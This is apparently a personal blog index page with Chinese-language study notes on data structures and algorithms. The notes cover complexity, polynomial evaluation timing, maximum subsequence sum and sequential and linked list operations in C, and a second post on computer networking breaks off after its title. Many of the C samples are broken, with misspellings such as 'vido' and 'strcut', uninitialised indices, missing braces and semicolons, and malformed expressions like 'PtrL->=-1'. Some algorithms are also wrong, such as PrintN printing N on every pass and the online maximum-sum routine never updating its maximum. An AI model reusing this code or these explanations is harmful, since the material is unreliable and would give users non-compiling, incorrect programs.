<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="John Doe">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Hexo"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="Hexo"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>page - Hexo</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.4.0"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">Hexo</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">
                数据结构与算法
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-19</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="数据结构与算法"><a href="#数据结构与算法" class="headerlink" title="数据结构与算法"></a>数据结构与算法</h1><h2 id="关于数据结构组织-例-图书的摆放"><a href="#关于数据结构组织-例-图书的摆放" class="headerlink" title="关于数据结构组织-例_图书的摆放"></a>关于数据结构组织-例_图书的摆放</h2><p>一、定义：数据结构是数据对象，以及存在于该对象的实例和组成实例的数据元素之间的各种联系。这些联系可以通过定义的函数来给出。（定义并不唯一）<br>二、对定义的解释（举例）<br>1、如何在书架上摆放图书？<br>&lt;1&gt;新书怎么插入？<br>&lt;2&gt;怎么找到某本指定的书？<br>方法1：随便放<br>方便新书插入，但极不方便找到某本指定的书。<br>方法2：按照书名的拼音字母顺序排放<br>用二分查找法查找指定的书，方便查找但不方便新书插入。<br>方法3：把书架划分成几块区域，每块区域指定摆放某种类别的图书；在每种类别内，按照书名拼音字母顺序排放<br>操作1：新书怎么插入？<br>先定类别，二分查找确定位置，移出空位<br>操作2：怎么找到某本指定的书？<br>先定类别，再二分法查找<br>问题：空间的分配及类别的分类<br><strong>总结：解决问题方法的效率和数据的组织方式有关</strong></p>
<h2 id="关于空间使用-例-PrintN函数的实现"><a href="#关于空间使用-例-PrintN函数的实现" class="headerlink" title="关于空间使用-例_PrintN函数的实现"></a>关于空间使用-例_PrintN函数的实现</h2><p>例子：写程序实现一个函数printN,使得传入一个正整数为N的参数后，能顺序打印从1到N的全部正整数<br>循环实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vido <span class="function"><span class="title">PrintN</span>(<span class="params">int N</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">printf(<span class="string">&quot;%d&quot;</span>,N）;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>递归实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vido <span class="function"><span class="title">PrintN</span>(<span class="params">int N</span>)</span></span><br><span class="line">&#123;<span class="keyword">if</span>(N)</span><br><span class="line">&#123;</span><br><span class="line">PrintN(N-<span class="number">1</span>)</span><br><span class="line">printf(<span class="string">&quot;%d&quot;</span>,N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当N=1000000时，递归方法无法实现；<br><strong>总结：解决问题方法的效率，跟空间的利用效率有关。</strong></p>
<h2 id="关于算法效率"><a href="#关于算法效率" class="headerlink" title="关于算法效率"></a>关于算法效率</h2><p>例子：写程序计算给定多项式在给定点x的值<br><img src="https://img-blog.csdnimg.cn/20210218100119938.png" alt="在这里插入图片描述"><br>方法一：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">double <span class="function"><span class="title">f</span>(<span class="params">int n,double a[],double x</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	double p=a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	p+=(a[i]*pow(x,i));</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法二：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">double <span class="function"><span class="title">f</span>(<span class="params">int n,double a[],double x</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	double p=a[i];</span><br><span class="line">	<span class="keyword">for</span>(i=n;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		p=a[i-<span class="number">1</span>]+x*p;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相关知识：函数pow(x,y)即数学函数，x的y次方;<br>clock():捕捉从程序开始运行到clock()被调用时所耗费的时间。这个时间单位是clock tick,即“时钟打点”<br>常数CLK_TCK:机器时钟每秒所走的时钟打点数。<br>计算程序时间的代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;time.h&gt;</span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line">clock_t start ,stop;</span><br><span class="line">double duration;</span><br><span class="line">#define MAXN <span class="number">10</span></span><br><span class="line">#define MAXK <span class="number">1e7</span></span><br><span class="line">double <span class="function"><span class="title">f1</span>(<span class="params">int n ,double a[],double x</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	double p=a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">	p+=(a[i]*pow(x,i));</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">double <span class="function"><span class="title">f2</span>(<span class="params">int n,double a[],double x</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	double p=a[i];</span><br><span class="line">	<span class="keyword">for</span>(i=n;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		p=a[i-<span class="number">1</span>]+x*p;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">int <span class="function"><span class="title">main</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	double a[MAXN];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAXK;i++)a[i]=(double)i;</span><br><span class="line"></span><br><span class="line">		start=clock();</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAXK;i++)</span><br><span class="line">	f1(MAXN-<span class="number">1</span>,a,<span class="number">1.1</span>);</span><br><span class="line">	stop=clock();</span><br><span class="line">	duration=(double)(stop-start)/CLK_TCK/MAXK;</span><br><span class="line">	printf(<span class="string">&quot;tickes=%f\n&quot;</span>,(double)(stop-start));</span><br><span class="line">	printf(<span class="string">&quot;duration1=%6.2e\n&quot;</span>,duration);</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAXK;i++)a[i]=(double)i;</span><br><span class="line">	start=clock();</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAXK;i++)</span><br><span class="line">	f2(MAXN-<span class="number">1</span>,a,<span class="number">1.1</span>);</span><br><span class="line">	stop=clock();</span><br><span class="line">	duration=(double)(stop-start)/CLK_TCK/MAXK;</span><br><span class="line">	printf(<span class="string">&quot;tickes=%f\n&quot;</span>,(double)(stop-start));</span><br><span class="line">	printf(<span class="string">&quot;duration2=%6.2e\n&quot;</span>,duration);</span><br><span class="line">	<span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<img src="https://img-blog.csdnimg.cn/2021021811352392.png" alt="在这里插入图片描述"><br><strong>总结：解决问题方法的效率与算法的巧妙有关。</strong></p>
<h2 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h2><p>一、所以到底什么是数据结构<br>1、数据对象在计算机的中的组织方式</p>
<ul>
<li>逻辑结构(一对一，一对多，多对多）</li>
<li>物理存储结构（计算机如何存储数据）<br>2、数据对象必定与一系列加在其上的操作相关联<br>3、完成这些操作所用的方法就是算法<br>二、抽象数据类型（Abstract Data Type）<br>1、数据类型<br>&lt;1&gt;数据对象集（是什么东西）<br>&lt;2&gt;数据集合相关联的操作集（对数据的操作）<br>2、抽象：描述数据类型的方法并不依赖于具体实现<br>&lt;1&gt;与存放数据的机器无关<br>&lt;2&gt;与数据存储的物理结构无关<br>&lt;3&gt;与实现操作的算法和编程语言均无关<br>也就是说只描述对象集和相关操作集“是什么”，并不涉及“如何做到”的问题。<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2>一、定义：<br>1、一个有限指令集<br>2、接受一些输入（有些情况下不需要输入）<br>3、必须产生输入<br>4、一定在有限步骤之后终止<br>5、每一条指令必须：</li>
<li>有充分明确的目标，不可以有歧义；</li>
<li>计算机能处理的范围之内</li>
<li>描述应不依赖于任何一种计算机语言以及具体的实现手段<br>二、什么是好的算法<br>1、空间复杂度S(n)——根据算法写成的程序在执行时占用存储单元的长度。这个长度往往与输入数据的规模有关。空间复杂度过高的算法可能导致使用的内存超限，造成程序非正常中断<br>2、时间复杂度T(n)——根据算法写成的程序在执行时耗费时间长度。这个长度往往也与输入数据的规模有关。时间复杂度过高的低效算法可能导致我们在有生之年都等不到结果<br>3、在分析一般算法的效率时，我们经常关注下面两种复杂度<br>&lt;1&gt;最坏情况复杂度<br>&lt;2&gt;平均复杂度</li>
</ul>
<p><strong>分析时常分析最坏情况复杂度</strong><br>4、复杂度的渐进表示法<br><img src="https://img-blog.csdnimg.cn/20210218174625144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析时，竭尽所能寻找最大的下届和最小的上界。<br><img src="https://img-blog.csdnimg.cn/20210218175132555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总结：1、若两段算法分别有复杂度T1(n)=O(f1(n))和T2（n)=O(f2(n)),则<br>&lt;1&gt;T1(n)+T2(n)=max(O(f1(n)),O(f2(n)))<br>&lt;2&gt;T1(n)*T2(n)=O(f1(n)*f2(n))<br>2、若T(n)是关于n的k阶多项式，那么T(n)=Θ(n的k次方)<br>3、一个for循环的时间复杂度等于循环次数乘以循环体代码的复杂度<br>4、if—else结构的复杂度取决于if的条件判断复杂度和两个分支的复杂度，总体复杂度取三者最大<br>例题：<img src="https://img-blog.csdnimg.cn/20210219094148184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>算法1：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">MaxSubseqsum1</span>(<span class="params">int A[],int N</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	int ThisSum,MaxSum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=i;j&lt;N;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			ThisSum=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(k=i;k&lt;=j;k++)</span><br><span class="line">			ThisSum+=A[k];</span><br><span class="line">			<span class="keyword">if</span>(ThisSum&gt;MaxSum)</span><br><span class="line">			MaxSum=ThisSum;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> MaxSum;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>
<p>算法2：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">MaxSubseqSum1</span>(<span class="params">int A[],int N</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	int i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">	ThisSum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(j=i;j&lt;N;j++)</span><br><span class="line">	&#123;</span><br><span class="line">	ThisSum+=A[j];</span><br><span class="line">	<span class="keyword">if</span>(ThisSum&gt;MaxSum)</span><br><span class="line">	MaxSum=ThisSum;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> MaxSum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>算法2要比算法1简单。<br>算法三（在线算法）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int MaxSubseqSum4(int A[],int N)</span><br><span class="line">int ThisSum,MaxSum;</span><br><span class="line">int i;</span><br><span class="line">ThisSum=MaxSum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">&#123;</span><br><span class="line">ThisSum+=A[i];</span><br><span class="line"><span class="keyword">if</span>(ThisSum&gt;MaxSum)</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ThisSum&lt;<span class="number">0</span>)</span><br><span class="line">ThisSum=<span class="number">0</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> MaxSum;</span><br></pre></td></tr></table></figure>
<h2 id="引子-多项式表示"><a href="#引子-多项式表示" class="headerlink" title="引子_多项式表示"></a>引子_多项式表示</h2><p>一、线性表及其实现<br>1、线性结构的定义：数据元素之间构成一个有序的序列<br>例子：<img src="https://img-blog.csdnimg.cn/20210220100308448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法1：采用顺序存储结构直接表示一元多项式<br><img src="https://img-blog.csdnimg.cn/2021022010062069.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>缺点：如果要表示x+pow(x,3000)，就必须采用一个大小至少为3001的数组，而在这个数据中大多数数据均为0，只有两项不为0，显然空间浪费得厉害。<br>方法二：顺序存储结构表示非零项：<img src="https://img-blog.csdnimg.cn/20210220101551201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>按指数大小有序排列</strong><br>方法三：链表结构存储非零项<br><img src="https://img-blog.csdnimg.cn/20210220102205932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>启示：<br>&lt;1&gt;同一个问题可以有不同的表示（存储）方法<br>&lt;2&gt;有一类共性问题：有序线性序列的组织和管理<br>2、什么是线性表<br>&lt;1&gt;定义：由同类型数据元素构成有序序列的线性结构<br>&lt;2&gt;特点：<br>1）表中元素个数被称为线性表长度<br>2）线性表没有元素时，称为空表<br>3）表起始位置称表头，表结束位置称表尾</p>
<p><img src="https://img-blog.csdnimg.cn/20210220105250909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>顺序存储</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef strcut LNode *List</span><br><span class="line">strcut LNode&#123;</span><br><span class="line">   ElementType Data[MAXSIZE];</span><br><span class="line">   int Last;</span><br><span class="line">   &#125;;</span><br><span class="line">   struct LNode L;</span><br><span class="line">   List PtrL;</span><br></pre></td></tr></table></figure>
<p>访问下标为i的元素：L.Data[i]或PtrL-&gt;Data[i]<br>线性表的长度：L.Last+1或PtrL-&gt;Last+1<br>主要操作的实现<br>1.初始化（建立空的顺序表）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List <span class="function"><span class="title">MakeEmpty</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;List PtrL;</span><br><span class="line">PtrL=(List)malloc(sizeof(struct LNode));</span><br><span class="line">PtrL-&gt;=-<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> PtrL;&#125;</span><br></pre></td></tr></table></figure>
<p>2.查找</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">Find</span>(<span class="params">ElementType X,List PtrL</span>)</span></span><br><span class="line">&#123;int i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=PtrL-&gt;Last&amp;&amp;PtrL-&gt;Data[i]!=X)</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(i&gt;PtrL-&gt;Last)</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> i;&#125;</span><br></pre></td></tr></table></figure>
<p>3.插入（第i（1&lt;=i&lt;=n+1））个位置上插入一个值为X的新元素）<br><img src="https://img-blog.csdnimg.cn/20210220194530637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="function"><span class="title">Insert</span>(<span class="params">ElementType X,int,List PtrL</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(PtrL-&gt;Last==MAXSIZE-<span class="number">1</span>)</span><br><span class="line">&#123;printf(<span class="string">&quot;表满&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;PtrL&gt;Last+<span class="number">2</span>)</span><br><span class="line">&#123;printf(<span class="string">&quot;位置不合法&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j=PtrL-&gt;Last;j&gt;=i-<span class="number">1</span>;j--)</span><br><span class="line">PtrL-&gt;Data[j+<span class="number">1</span>]=PtrL-&gt;Data[j];</span><br><span class="line">PtrL-&gt;Data[i-<span class="number">1</span>]=X;</span><br><span class="line">PtrL-&gt;Last++;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>平均移动次数为n/2<br>平均时间性能为O（n）<br>4.删除（删除表的第i(1&lt;=i&lt;=n）个位置上的元素）<br><img src="https://img-blog.csdnimg.cn/20210220202858975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="function"><span class="title">Delete</span>(<span class="params">int i,List PtrL</span>)</span></span><br><span class="line">&#123;int j;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;PtrL-&gt;Last+<span class="number">1</span>)&#123;</span><br><span class="line">printf(<span class="string">&quot;不存在第%d个元素&quot;</span>,i);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j=i;j&lt;=PtrL-&gt;Last;j++)</span><br><span class="line">PtrL-&gt;Data[j-<span class="number">1</span>]=PtrL--&gt;Data[j];</span><br><span class="line">PtrL-&gt;Last--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>线性表的链式存储实现</strong><br>主要操作的实现<br>1、求表长</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">Length</span>(<span class="params">List PtrL</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List p=PtrL;</span><br><span class="line">int j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;p=p-&gt;Next;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度为：O(n)<br>2、查找<br>（1）按序号查找:FindKth</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">List <span class="function"><span class="title">FindKth</span>(<span class="params">int K,List PtrL</span>)</span></span><br><span class="line">&#123;List p=PtrL;</span><br><span class="line">int i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(p!=NULL&amp;&amp;i&lt;k)</span><br><span class="line">&#123;</span><br><span class="line">p=p-&gt;Next</span><br><span class="line">i++;&#125;</span><br><span class="line"><span class="keyword">if</span>(i==k)<span class="keyword">return</span> p;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/18/%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80/">
                计算机网络自顶向下
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>@<a href="%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B">TOC</a></p>
